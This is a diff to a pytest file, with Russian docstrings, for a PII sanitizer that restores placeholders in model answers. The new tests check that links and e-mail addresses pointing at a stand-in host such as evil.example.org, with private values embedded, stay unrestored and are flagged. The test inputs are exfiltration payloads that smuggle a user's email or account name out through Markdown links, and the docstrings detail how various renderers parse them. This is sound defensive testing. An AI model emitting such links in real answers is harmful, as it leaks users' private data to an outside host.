@@ -309,6 +309,7 @@ def test_own_links_with_character_references_are_restored(settings, answer, rest
         r"Отчёт: https\:\/\/evil.example.org/?q=<EMAIL_1>",
         "Отчёт: (https&colon;&sol;&sol;evil.example.org/?q=<EMAIL_1>&nbsp;x)",
         r"[x](https\:\/\/evil.example.org/?q=<EMAIL_1>)",
+        r"Отчёт: &https\:\/\/evil.example.org/?q=<EMAIL_1>",
     ],
 )
 def test_nothing_is_restored_inside_a_link_that_markdown_decodes_in_prose(settings, answer):
@@ -465,6 +466,46 @@ def test_www_inside_a_word_before_our_domain_or_without_labels_restores(settings
 @pytest.mark.parametrize(
     "answer",
     [
+        "Отчёт: https://evil.example.org/x`<EMAIL_1>",
+        "www.evil.example.org/x`<EMAIL_1>",
+        "https://evil.example.org/x`y`<EMAIL_1>",
+        "`code`https://evil.example.org/x`<EMAIL_1>",
+        r"\`https://evil.example.org/x`<EMAIL_1>",
+        '"https://evil.example.org/x`<EMAIL_1>"',
+        "'https://evil.example.org/x`<EMAIL_1>'",
+        "mailto:<EMAIL_1>`пример.рф",
+    ],
+)
+def test_backtick_does_not_end_a_bare_link(settings, answer):
+    """Наблюдение раунда 5, P2: голый адрес кончался на «`», а непарную обратную кавычку все Markdown-читатели берут в
+    ссылку — «https://evil…/x`<EMAIL_1>» после восстановления вёл на evil с адресом. Проверено 15.10.2026: markdown-it
+    14.1.0, marked 15.0.12, remark-gfm 4.0.1, micromark-extension-gfm 3.0.0, cmark-gfm 2025.10.22, mistune 3.3.4 — и после
+    закрывающей кавычки («`code`https://…»), и после экранированной; не ссылка только адрес внутри кода. markdown-it так же
+    продолжает и mailto: — на домен «contoso.ru`пример.рф»."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        ("`https://host-1.domain-1.example/` <EMAIL_1>", "`https://srv-dc01.contoso.ru/` ivanov@contoso.ru"),
+        ("`https://evil.example.org/x` <EMAIL_1>", "`https://evil.example.org/x` ivanov@contoso.ru"),
+        ("`https://evil.example.org/x`, <EMAIL_1>", "`https://evil.example.org/x`, ivanov@contoso.ru"),
+        ("https://host-1.domain-1.example/x`<EMAIL_1>", "https://srv-dc01.contoso.ru/x`ivanov@contoso.ru"),
+        ("`mailto:<EMAIL_1>`", "`mailto:ivanov@contoso.ru`"),
+    ],
+)
+def test_code_span_with_a_link_and_a_label_after_it_restores(settings, answer, restored):
+    """Та же находка с другой стороны: адрес в коде и метка через пробел или знак препинания после кода, наш адрес
+    с обратной кавычкой и mailto в коде восстанавливаются."""
+    result = restore(link_state(), answer, settings)
+    assert result.text == restored and "foreign_link" not in kinds(result)
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
         "Отчёт: evil.ru/?q=<EMAIL_1>",
         "evil.ru:8080/<EMAIL_1>",
         "(см. evil.ru/c?u=<EMAIL_1>)",
@@ -535,6 +576,110 @@ def test_original_only_in_the_host_of_a_link_without_a_scheme_is_restored(settin
     восстанавливается, как имя, выведенное из частей (7, шаг 4)."""
     result = restore(person_state(), answer, settings)
     assert result.text == restored and "foreign_link" not in kinds(result)
+
+
+def account_state() -> ChatState:
+    state = ChatState(chat_id="accounts", net_key=bytes(range(32)))
+    sanitize(state, "Вход petrov@10.1.2.5, почта ivanov@contoso.ru, узел srv-dc01.contoso.ru", Settings())
+    return state
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        "Пишите <ACCOUNT_1>@evil.example.org",
+        "<ACCOUNT_1>@evil.dev",
+        "<ACCOUNT_1>@пример.рф",
+        "x.<ACCOUNT_1>@evil.example.org",
+        "<ACCOUNT_1>@host-1.evil.example.org",
+        '{"a":"<ACCOUNT_1>","b":"x@evil.example.org"}',
+        "<EMAIL_1>.evil.example.org",
+        "<EMAIL_1>.boss@evil.example.org",
+        r"<ACCOUNT_1>\@evil.example.org",
+        "<ACCOUNT_1>&#64;evil.example.org",
+        r"&<ACCOUNT_1>\@evil.example.org",
+        "<ACCOUNT_1>@evil.dev_",
+        "<ACCOUNT_1>@x~evil.example.org`;)`",
+        "<ACCOUNT_1>@.evil.example.org",
+        "<ACCOUNT_1>@пример.рфhttps://x.example.org/",
+        "x domain-1.example={ip}@evil.example.org",
+        "<EMAIL_1>evil.dev,<ACCOUNT_1>@пример.рф",
+        "x@_<ACCOUNT_1>@пример.рф_",
+    ],
+)
+def test_original_in_an_address_at_a_foreign_domain_stays_a_label(settings, answer):
+    """Наблюдение раунда 5, P3: «<ACCOUNT_1>@evil…» восстанавливалось в «petrov@evil…», а голый адрес e-mail делают
+    ссылкой mailto cmark-gfm (GitHub), remark-gfm, micromark, marked и markdown-it (linkify-it, fuzzyEmail) — вопреки
+    правилу mailto (раздел 7). Имя до «@» у markdown-it шире — с «"», «:», «=» и «,», поэтому в сжатом JSON ссылка
+    тянется от «"a"» до чужого домена; домен у него и не ASCII, у остальных — с «_» и без проверки суффикса. cmark-gfm берёт
+    имя до прежнего «@» («contoso.ru.boss@evil…»), он и remark-gfm ищут адрес после раскрытия «\\@» и «&#64;», marked
+    отступает в домене до буквы («evil.dev_» — «evil.de»), домен бывает с точкой впереди, а markdown-it обрывает домен перед
+    ссылкой со схемой («пример.рфhttps://…» — «пример.рф») и кодом. Запись ответа остаётся во всём имени, какое берёт
+    любой читатель («contoso.ru=10.1.2.5@evil…» у markdown-it), а имя linkify-it начинается и за «@», которую оставил
+    меткой чужой адрес слева, и за «_» выделения."""
+    state = account_state()
+    answer = answer.replace("{ip}", fake_ip(state))
+    result = restore(state, answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        ("<ACCOUNT_1>@domain-1.example", "petrov@contoso.ru"),
+        ("ssh <ACCOUNT_1>@host-1.domain-1.example", "ssh petrov@srv-dc01.contoso.ru"),
+        ("ssh <ACCOUNT_1>@{ip}", "ssh petrov@10.1.2.5"),
+        ("ssh <ACCOUNT_1>@host-1", "ssh petrov@srv-dc01"),
+        ("To:<EMAIL_1>", "To:ivanov@contoso.ru"),
+        ('{"user":"<ACCOUNT_1>","mail":"<EMAIL_1>"}', '{"user":"petrov","mail":"ivanov@contoso.ru"}'),
+        ("<EMAIL_1>,boss@evil.example.org", "ivanov@contoso.ru,boss@evil.example.org"),
+        ("аватар: img/<EMAIL_1>.png", "аватар: img/ivanov@contoso.ru.png"),
+        (r"<ACCOUNT_1>\@domain-1.example", r"petrov\@contoso.ru"),
+        ("admin@evil.example.org, <ACCOUNT_1>", "admin@evil.example.org, petrov"),
+    ],
+)
+def test_address_at_our_domain_or_from_one_value_restores(settings, answer, restored):
+    """Та же находка с другой стороны: адрес на нашем домене, узле или адресе, имя без точки в домене, адрес, который
+    дало одно значение (и с «To:» или JSON перед ним, которые markdown-it берёт в имя), чужой адрес вплотную за нашим
+    (имя у читателей не тянется через прежний адрес), домен без известного суффикса — его нет в DNS — и чужой адрес, в
+    котором нечего восстанавливать, восстанавливаются, как раньше."""
+    state = account_state()
+    result = restore(state, answer.replace("{ip}", fake_ip(state)), settings)
+    assert result.text == restored and "foreign_link" not in kinds(result)
+
+
+def test_address_at_a_host_from_the_request_written_with_a_retyped_part_restores():
+    """Та же находка: домен «<SECRET_1>.domain-1.example» — не наш по записи (метка не узла), но восстанавливается в
+    имя узла из запроса «srv01.contoso.ru», и письмо уходит на него; метка с другим значением даёт имя, которого в
+    запросе не было, — чужой узел под нашим доменом, как «evil.domain-1.example»."""
+    settings = Settings(policies=default_policies() | {T.SECRET: Policy.BLOCK})
+    state = ChatState(chat_id="retyped", net_key=bytes(range(32)))
+    sanitize(state, "узел srv01.contoso.ru и srv01", settings)
+    ops.retype(state, next(e for e in state.entities.values() if e.key == "srv01").id, T.SECRET)
+    assert sanitize(state, "почта ivanov@srv01.domain-1.example", settings).sanitized == (
+        "почта <ACCOUNT_1>@<SECRET_1>.domain-1.example"
+    )
+    own = restore(state, "Пишите <ACCOUNT_1>@<SECRET_1>.domain-1.example", settings)
+    assert own.text == "Пишите ivanov@srv01.contoso.ru" and "foreign_link" not in kinds(own)
+    state.entities["s9"] = Entity("s9", T.SECRET, 9, "qwerty", "qwerty", "manual", ["qwerty"])
+    state.surrogates["<SECRET_9>"] = Surrogate("s9")
+    answer = "Пишите <ACCOUNT_1>@<SECRET_9>.domain-1.example"
+    foreign = restore(state, answer, settings)
+    assert (foreign.text, kinds(foreign)) == (answer, ["foreign_link"])
+
+
+def test_name_that_no_renderer_takes_into_an_address_restores(settings):
+    """Та же находка: имя до «@» у всех читателей — только из букв ASCII, и «Иван Петров@…» ссылкой не становится."""
+    result = restore(person_state(), "<PERSON_1>@evil.example.org", settings)
+    assert result.text == "Иван Петров@evil.example.org" and "foreign_link" not in kinds(result)
+
+
+def test_address_at_a_foreign_domain_is_one_foreign_segment(settings):
+    """Та же находка: чужой адрес — один кусок foreign_link с записью ответа, метка рядом восстанавливается."""
+    result = restore(account_state(), "Пишите <ACCOUNT_1>@evil.example.org, вход <ACCOUNT_1>", settings)
+    assert result.text == "Пишите <ACCOUNT_1>@evil.example.org, вход petrov"
+    assert [result.text[s.start:s.end] for s in result.segments] == ["<ACCOUNT_1>@evil.example.org", "petrov"]
+    assert (result.counters["restored"], result.counters["foreign_links"]) == (1, 1)
 
 
 def test_host_is_after_the_last_at_sign(settings):
@@ -664,6 +809,43 @@ def test_own_links_and_paths_with_backslashes_are_restored(settings, answer, res
     """Та же находка с другой стороны: наш адрес с обратными косыми восстанавливается, а «\\\\» внутри пути
     Windows в строке кода — не начало адреса."""
     assert restore(link_state(), answer, settings).text == restored
+
+
+@pytest.mark.parametrize(
+    "answer, restored",
+    [
+        (r'"pattern": ".*\\.host-1\\.domain-1\\.example"', r'"pattern": ".*\\.srv-dc01\\.contoso\\.ru"'),
+        (r'"pattern": "\\bhost-1\\.domain-1\\.example\\b"', r'"pattern": "\\bsrv-dc01\\.contoso\\.ru\\b"'),
+        (r'"pattern": "(\\.|^)domain-1\\.example$"', r'"pattern": "(\\.|^)contoso\\.ru$"'),
+        (
+            r'{"re": "\\bwww\\.domain-1\\.example\\b", "owner": "<EMAIL_1>"}',
+            r'{"re": "\\bwww\\.contoso\\.ru\\b", "owner": "ivanov@contoso.ru"}',
+        ),
+    ],
+)
+def test_regex_escapes_in_a_json_string_are_not_a_foreign_host(settings, answer, restored):
+    """Наблюдение раунда 5, P3: в регулярном выражении внутри строки JSON «\\\\» после знака выражения («.*\\\\.») или
+    перед «b» читалась как начало адреса без схемы, и имя через «\\\\.» не восстанавливалось. «\\» кончает хост (WHATWG
+    URL, путь UNC), и точка сразу за ней — уже не точка хоста; хост «\\\\.host-1» и «\\\\bhost-1» — одно имя без домена."""
+    result = restore(link_state(), answer, settings)
+    assert result.text == restored and "foreign_link" not in kinds(result)
+
+
+@pytest.mark.parametrize(
+    "answer",
+    [
+        r'<a href="\\evil.example.org\x?q=<EMAIL_1>">',
+        r'<img src="\\.evil.example.org\<EMAIL_1>">',
+        r'"pattern": ".*\\.evil.example.org\<EMAIL_1>"',
+        r'"\\bevil.example.org\<EMAIL_1>"',
+        r"\\.evil.example.org\share\<EMAIL_1>",
+    ],
+)
+def test_backslashes_before_a_dotted_host_still_lead_to_it(settings, answer):
+    """Та же находка с другой стороны: атрибут с «\\\\» в начале и имя с точками без «\\» перед ними после «\\\\», «\\\\.»
+    и «\\\\b» по-прежнему ведут на чужой узел."""
+    result = restore(link_state(), answer, settings)
+    assert (result.text, kinds(result)) == (answer, ["foreign_link"])
 
 
 @pytest.mark.parametrize(
